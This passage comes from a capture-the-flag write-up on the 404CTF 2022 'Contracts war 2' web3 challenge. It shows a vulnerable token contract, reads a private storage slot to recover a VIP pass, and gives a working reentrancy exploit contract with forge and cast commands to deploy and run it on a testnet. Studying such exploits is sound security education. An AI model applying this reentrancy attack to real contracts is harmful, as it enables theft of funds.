+</span></span><span class=line><span class=cl>   <span class=n>allowed</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>][</span><span class=n>delegate</span><span class=p>]</span> <span class=o>=</span> <span class=n>numTokens</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>Approval</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>delegate</span><span class=p>,</span> <span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>reset</span><span class=p>()</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>string</span> <span class=k>memory</span><span class=p>){</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>lastWithdrawTime</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=s>&#34;Pas d&#39;argent pour les impatients !&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>allowance</span><span class=p>(</span><span class=kt>address</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=n>delegate</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=n>delegate</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>transferFrom</span><span class=p>(</span><span class=kt>address</span> <span class=n>owner</span><span class=p>,</span> <span class=kt>address</span> <span class=n>buyer</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>public</span> <span class=k>override</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;=</span> <span class=n>balances</span><span class=p>[</span><span class=n>owner</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>numTokens</span> <span class=o>&lt;=</span> <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=n>owner</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=n>owner</span><span class=p>].</span><span class=n>sub</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>=</span> <span class=n>allowed</span><span class=p>[</span><span class=n>owner</span><span class=p>][</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>].</span><span class=n>sub</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>balances</span><span class=p>[</span><span class=n>buyer</span><span class=p>]</span> <span class=o>=</span> <span class=n>balances</span><span class=p>[</span><span class=n>buyer</span><span class=p>].</span><span class=n>add</span><span class=p>(</span><span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>Transfer</span><span class=p>(</span><span class=n>owner</span><span class=p>,</span> <span class=n>buyer</span><span class=p>,</span> <span class=n>numTokens</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=kc>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// senior function to get the vip pass.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kd>function</span> <span class=nf>senior</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>10</span> <span class=o>*</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Revenez dans quelque temps.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=n>seniority</span><span class=p>[</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>150</span> <span class=o>*</span> <span class=mi>365</span> <span class=kc>days</span><span class=p>,</span> <span class=s>&#34;Vous vous faites vieux, laissez-nous la place.&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>   <span class=k>return</span> <span class=n>vipPass</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>fallback</span> <span class=p>()</span> <span class=k>external</span> <span class=k>payable</span>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=nb>revert</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>modifier</span> <span class=nf>onlyOwner</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span> <span class=o>==</span> <span class=n>boss</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>_</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// SafeMath to avoid integer underflow or overflow
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=kd>library</span> <span class=n>SafeMath</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>sub</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>a</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>b</span><span class=p>)</span> <span class=k>internal</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl> <span class=nb>assert</span><span class=p>(</span><span class=n>b</span> <span class=o>&lt;=</span> <span class=n>a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl> <span class=k>return</span> <span class=n>a</span> <span class=o>-</span> <span class=n>b</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>add</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>a</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>b</span><span class=p>)</span> <span class=k>internal</span> <span class=k>pure</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl> <span class=kt>uint256</span> <span class=n>c</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> <span class=nb>assert</span><span class=p>(</span><span class=n>c</span> <span class=o>&gt;=</span> <span class=n>a</span><span class=p>);</span>
+</span></span><span class=line><span class=cl> <span class=k>return</span> <span class=n>c</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Comment has been added on the function that will be exploited.</p><h1 id=exploitation>Exploitation</h1><h2 id=vippass>VipPass</h2><p>By seeing this contract, the goal was pretty clear. We want to get the vip pass. One thing that should never be forgotten in solidity:</p><blockquote><p>Nothing is private in smart contracts!</p></blockquote><p>The public variable can be accessed easly with call instruction. In other hand, the private variable can be accessed only with the function rpc function <code>eth_getStorageAt</code> (the name may be different depending of the client). The slot storage are explains in depth in <a class=link href=https://docs.soliditylang.org/en/v0.8.7/internals/layout_in_storage.html target=_blank rel=noopener>soliditylang</a>.</p><p>Basically, compare to other types, uint256 is easy to understand. Its position slot is the position of the declared variable (note that the mapping does not count). In our case <code>uint256 private vipPass;</code> is at position <strong>4</strong>, the variable <code>boss</code> (the owner of the contract) is at position <strong>5</strong>.</p><p>To access the variable <code>vipPass</code>, we will use cast from the foundry binaries:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ <span class=c1># cast storage &lt;contract address&gt; &lt;slot number&gt;</span>
+</span></span><span class=line><span class=cl>$ cast storage 0xD5c0873f147cECF336fEEF1a28474716C745Df86 <span class=m>4</span>
+</span></span><span class=line><span class=cl>0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080
+</span></span></code></pre></td></tr></table></div></div><p>The function <code>senior()</code> returns the vipPass as an <code>uint256</code> value. The <code>cast storage</code> command returns the value as a hexadecimal string. We can either use an <a class=link href=https://www.rapidtables.com/convert/number/hex-to-decimal.html target=_blank rel=noopener>online converter</a> or solidity (with foundry dependencies).</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>ContractTest</span> <span class=k>is</span> <span class=n>Test</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>convert</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>   <span class=c1>//address test = address(0x9A5a04eCC45BB46877ADcd1Fa4dB82C08D1bd080);
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=c1>//uint256 test2 = uint256(uint160(test));
+</span></span></span><span class=line><span class=cl><span class=c1></span>   <span class=kt>uint256</span> <span class=n>test3</span> <span class=o>=</span> <span class=mh>0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>   <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span><span class=s>&#34;test2: &#34;</span><span class=p>,</span> <span class=n>test3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>This contract can be executed with the <code>forge</code> command:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ forge run test/Converter.t.sol --fork-url http://127.0.0.1:8545 --sig <span class=s2>&#34;convert()&#34;</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>⠒<span class=o>]</span> Compiling...
+</span></span><span class=line><span class=cl><span class=o>[</span>⠆<span class=o>]</span> Compiling <span class=m>6</span> files with 0.8.13
+</span></span><span class=line><span class=cl><span class=o>[</span>⠰<span class=o>]</span> Solc 0.8.13 finished in 2.05s
+</span></span><span class=line><span class=cl>Compiler run successful
+</span></span><span class=line><span class=cl>Script ran successfully.
+</span></span><span class=line><span class=cl>Gas used: <span class=nv>2108</span>
+</span></span><span class=line><span class=cl><span class=o>==</span> <span class=nv>Return</span> <span class=o>==</span>
+</span></span><span class=line><span class=cl><span class=o>==</span> <span class=nv>Logs</span> <span class=o>==</span>
+</span></span><span class=line><span class=cl>  test2: : <span class=m>38330739118242568697380065849010598905319469511070891991863930858741423657088</span>
+</span></span></code></pre></td></tr></table></div></div><p>Unfortunately, the vipPass is not the only thing that is required, we need to have an address that is VIP:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc challenge.404ctf.fr <span class=m>30885</span>
+</span></span><span class=line><span class=cl>Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass :
+</span></span><span class=line><span class=cl><span class=m>38330739118242568697380065849010598905319469511070891991863930858741423657088</span>
+</span></span><span class=line><span class=cl>Nous allons maintenant vérifier que vous êtes bien un vip.
+</span></span><span class=line><span class=cl>Veuillez rentrer l<span class=err>&#39;</span>adresse ethereum avec laquelle vous êtes vip :
+</span></span></code></pre></td></tr></table></div></div><h2 id=pwning-the-contract>Pwning the contract</h2><p>To get VIP we have to pass two requires: <code>require(seniority[msg.sender] >= 10 * 365 days, "Revenez dans quelque temps.");</code> and <code>require(seniority[msg.sender] &lt; 150 * 365 days, "Vous vous faites vieux, laissez-nous la place.");</code>.</p><p>The only function that update the seniroity mapping is <code>function sellHLB(uint256 numTokens)</code>. This function can only be called once a year and if we have already some HLB tokens. Before updating the <code>lastWithdrawTime</code> variable to restrict the call to that function, the fallback to our contract is called, which can call the <code>sellHLB(uint256 numTokens)</code> function. In other words, we can call the function <code>sellHLB(uint256 numTokens)</code> multiple times before the <code>lastWithdrawTime</code> function is updated, this is a reentrency attack!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>13</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;ds-test/test.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;forge-std/Test.sol&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>interface</span> <span class=nc>IHallebardeToken</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>sellHLB</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>numTokens</span><span class=p>)</span> <span class=k>external</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>seniorityOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>balanceOf</span><span class=p>(</span><span class=kt>address</span> <span class=n>tokenOwner</span><span class=p>)</span> <span class=k>external</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>buyHLB</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>senior</span><span class=p>()</span> <span class=k>external</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>uint256</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>TokenTest</span> <span class=k>is</span> <span class=n>Test</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>IHallebardeToken</span> <span class=n>ht</span> <span class=o>=</span>
+</span></span><span class=line><span class=cl>   <span class=n>IHallebardeToken</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=mh>0xD5c0873f147cECF336fEEF1a28474716C745Df86</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>()</span> <span class=k>payable</span> <span class=p>{}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>pwn</span><span class=p>()</span> <span class=k>public</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>ht</span><span class=p>.</span><span class=n>buyHLB</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=mi>12</span><span class=p>}();</span>
+</span></span><span class=line><span class=cl>        <span class=n>ht</span><span class=p>.</span><span class=n>sellHLB</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=n>ht</span><span class=p>.</span><span class=n>senior</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>receive</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>log_named_uint</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s>&#34;seniority&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=n>ht</span><span class=p>.</span><span class=n>seniorityOf</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=nb>this</span><span class=p>))</span> <span class=o>/</span> <span class=mi>365</span> <span class=kc>days</span>
+</span></span><span class=line><span class=cl>        <span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>8</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=n>i</span><span class=o>++</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=n>ht</span><span class=p>.</span><span class=n>sellHLB</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Running the above script with forge:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>forge run test/token.t.sol --fork-url http://127.0.0.1:8545 --sig <span class=s2>&#34;pwn()&#34;</span> -vvvv
+</span></span></code></pre></td></tr></table></div></div><p>returns the following output:</p><p>This output is typical of a reentrancy attack.</p><p>The final step is to deploy our contract to the <strong>ropsten</strong> blockchain and execute the pwn function. While deploying, ether has to be sent to the contract.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ forge create --rpc-url https://ropsten.infura.io/v3/&lt;API key&gt;  --private-key &lt;private key&gt;
+</span></span><span class=line><span class=cl>a4b7b56f3870d40feb26 test/token.t.sol:TokenTest --value <span class=m>100</span> <span class=c1># value is required to send ether to the contract. Otherwise the buyHLB cannot work.</span>
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8
+</span></span><span class=line><span class=cl>Deployed to: 0x0afd7d482b51834b1cad91c313d21425f1ad3f61
+</span></span><span class=line><span class=cl>Transaction hash: 0xa927b9bc266083aed45944efef8bd147ebd0a50e681bd32c473beb1d4e7e2c3
+</span></span><span class=line><span class=cl><span class=m>7</span>
+</span></span></code></pre></td></tr></table></div></div><p>The function pwn can then be called.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ cast send 0x0afd7d482b51834b1cad91c313d21425f1ad3f61 <span class=s2>&#34;pwn()&#34;</span>
+</span></span><span class=line><span class=cl>  --rpc-url https://ropsten.infura.io/v3/&lt;API key&gt; --private
+</span></span><span class=line><span class=cl>-key &lt;private key&gt;
+</span></span><span class=line><span class=cl>...
+</span></span><span class=line><span class=cl>transactionHash         0x17621fe1437f1ec5e6f9533aaf864d7a60bae4d54293f21d5290982dc
+</span></span><span class=line><span class=cl>42ea2bd
+</span></span><span class=line><span class=cl>...
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/writeup-404ctf-2022-contracts-war-2-web3/reentrancy-attack.png width=1052 height=611 srcset="/p/writeup-404ctf-2022-contracts-war-2-web3/reentrancy-attack_hu2b5971578eb9cff2dbbe8ab67ff60edc_154078_480x0_resize_box_3.png 480w, /p/writeup-404ctf-2022-contracts-war-2-web3/reentrancy-attack_hu2b5971578eb9cff2dbbe8ab67ff60edc_154078_1024x0_resize_box_3.png 1024w" loading=lazy alt="Reentrancy attack" class=gallery-image data-flex-grow=172 data-flex-basis=413px></p><p>The attack is successful and the <code>seniority</code> variable has been updated multiple times before the <code>lastWithdrawTime</code> got updated.</p><p>We can now validate the challenge by specifying our contract address.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/foundry/>foundry</a>
+<a href=/tags/solidity/>solidity</a>
+<a href=/tags/reentrancy/>reentrancy</a>
+<a href=/tags/web3/>web3</a></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article class=has-image><a href=/p/writeup-404ctf-2022-contracts-war-1-web3/><div class=article-image><img src=/images/404CTF.png loading=lazy data-key data-hash=/images/404CTF.png></div><div class=article-details><h2 class=article-title>Writeup 404CTF 2022 - Contracts war 1 (web3)</h2></div></a></article><article class=has-image><a href=/p/writeup-404ctf-2022-public-key-web3/><div class=article-image><img src=/images/404CTF.png loading=lazy data-key data-hash=/images/404CTF.png></div><div class=article-details><h2 class=article-title>Writeup 404CTF 2022 - public key (web3)</h2></div></a></article><article class=has-image><a href=/p/ethernaut-challenges/><div class=article-image><img src=/images/openzeppelin-logo.svg loading=lazy data-key data-hash=/images/openzeppelin-logo.svg></div><div class=article-details><h2 class=article-title>Ethernaut challenges</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
+2022 Nodauf</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.11.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#vippass>VipPass</a></li><li><a href=#pwning-the-contract>Pwning the contract</a></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js 